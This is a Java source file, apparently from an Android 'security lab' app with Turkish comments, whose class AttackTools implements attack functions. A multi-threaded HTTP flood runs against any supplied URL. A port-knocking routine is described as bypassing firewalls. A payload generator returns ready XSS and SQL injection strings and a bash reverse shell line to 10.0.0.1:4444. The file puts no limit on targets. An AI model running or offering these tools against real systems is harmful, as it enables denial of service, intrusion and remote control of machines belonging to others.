package com.example.karageyazilimsecuritylab;

import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;

public class AttackTools {

    private static boolean isAttacking = false;

    // 1. HTTP FLOOD (DoS Simülasyonu)
    public static void startHttpFlood(String targetUrl, int threads) {
        if (!targetUrl.startsWith("http")) targetUrl = "http://" + targetUrl;
        final String finalUrl = targetUrl;
        isAttacking = true;

        for (int i = 0; i < threads; i++) {
            new Thread(() -> {
                while (isAttacking) {
                    try {
                        URL url = new URL(finalUrl);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setConnectTimeout(1000);
                        conn.getResponseCode(); // İsteği tetikle
                        conn.disconnect();
                    } catch (Exception ignored) {}
                }
            }).start();
        }
    }

    public static void stopAttack() {
        isAttacking = false;
    }

    // 2. PORT KNOCKING (Gizli Kapı Çalma)
    // Güvenlik duvarlarını aşmak için belirli portlara sırayla vurur.
    public static String portKnock(String ip) {
        int[] sequence = {7000, 8000, 9000}; // Örnek gizli sekans
        try {
            for (int port : sequence) {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(ip, port), 500);
                    socket.close();
                } catch (Exception ignored) {}
                Thread.sleep(100); // Vuruşlar arası bekleme
            }
            return "Knocking işlemi tamamlandı (" + ip + "). Gizli servis kontrol ediliyor...";
        } catch (Exception e) { return "Knock hatası."; }
    }

    // 3. PAYLOAD GENERATOR (Hazır Exploit Kodları)
    public static String generatePayload(String type) {
        switch (type.toLowerCase()) {
            case "xss":
                return "XSS Payloads:\n" +
                        "1. <script>alert(1)</script>\n" +
                        "2. <img src=x onerror=alert(1)>\n" +
                        "3. <svg/onload=alert(1)>";
            case "sqli":
                return "SQLi Payloads:\n" +
                        "1. ' OR 1=1 --\n" +
                        "2. ' UNION SELECT null, version() --\n" +
                        "3. admin' --";
            case "cmd":
                return "Reverse Shell (Linux):\n" +
                        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
            case "android":
                return "ADB Bypass:\n" +
                        "adb shell pm list packages";
            default:
                return "Mevcut türler: xss, sqli, cmd, android";
        }
    }
}